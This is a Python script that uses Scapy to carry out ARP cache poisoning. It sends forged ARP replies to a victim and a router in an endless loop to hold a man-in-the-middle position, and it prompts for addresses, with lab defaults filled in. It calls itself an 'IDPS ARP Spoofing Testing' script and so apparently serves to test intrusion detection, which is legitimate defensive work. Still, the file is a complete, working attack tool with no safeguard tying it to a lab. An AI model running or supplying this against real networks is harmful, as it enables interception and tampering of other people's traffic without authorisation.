from scapy.all import ARP, send
from time import sleep
import sys

def craft_arp_poison(target_ip, target_mac, fake_ip, attacker_mac):
    """
    Constructs a malicious ARP reply to overwrite the target's ARP cache.

    :param target_ip: The IP of the machine we want to deceive.
    :param target_mac: The actual MAC address of the target machine.
    :param fake_ip: The IP we are pretending to be (e.g., the Router's IP).
    :param attacker_mac: The attacker's MAC address to associate with fake_ip.
    :return: A Scapy ARP packet object.
    """
    # op=2 is an ARP Reply. We send it unrequested (Gratuitous) to poison the cache.
    return ARP(
        op=2, 
        psrc=fake_ip, 
        hwsrc=attacker_mac, 
        pdst=target_ip, 
        hwdst=target_mac
    )

def start_spoofing(victim_ip, victim_mac, router_ip, router_mac, attacker_mac):
    """
    Runs the infinite loop to maintain the Man-In-The-Middle position.

    :param victim_ip: Target victim's IP.
    :param victim_mac: Target victim's MAC.
    :param router_ip: Gateway/Router IP.
    :param router_mac: Gateway/Router MAC.
    :param attacker_mac: The MAC address of this machine.
    """
    # Prepare the poison packets for both sides
    to_victim = craft_arp_poison(victim_ip, victim_mac, router_ip, attacker_mac)
    to_router = craft_arp_poison(router_ip, router_mac, victim_ip, attacker_mac)

    print(f"\n[!] Spoofing active: {victim_ip} <--> {router_ip}")
    print("[*] Press Ctrl+C to stop the attack and exit.")

    try:
        while True:
            # Send packets every 2 seconds to ensure the ARP table stays poisoned
            send(to_victim, verbose=False)
            send(to_router, verbose=False)
            sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Stopping ARP Spoofing...")

def main():
    """
    Main entry point for the ARP Spoofing test script.
    Handles user input and initializes the attack.
    """
    print("IDPS ARP Spoofing Testing: ")
    
    try:
        # Collecting parameters with clear defaults for the lab environment
        att_mac = input("Enter Attacker MAC [CC:47:40:F6:21:E6]: ").strip() or "CC:47:40:F6:21:E6"
        r_ip    = input("Enter Router IP   [192.168.1.1]: ").strip() or "192.168.1.1"
        r_mac   = input("Enter Router MAC  [0c:b9:37:86:7b:7b]: ").strip() or "0c:b9:37:86:7b:7b"
        v_ip    = input("Enter Victim IP   [192.168.1.10]: ").strip() or "192.168.1.10"
        v_mac   = input("Enter Victim MAC  [b8:81:98:87:11:99]: ").strip() or "b8:81:98:87:11:99"

        start_spoofing(v_ip, v_mac, r_ip, r_mac, att_mac)

    except Exception as e:
        print(f"\n[X] Critical Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()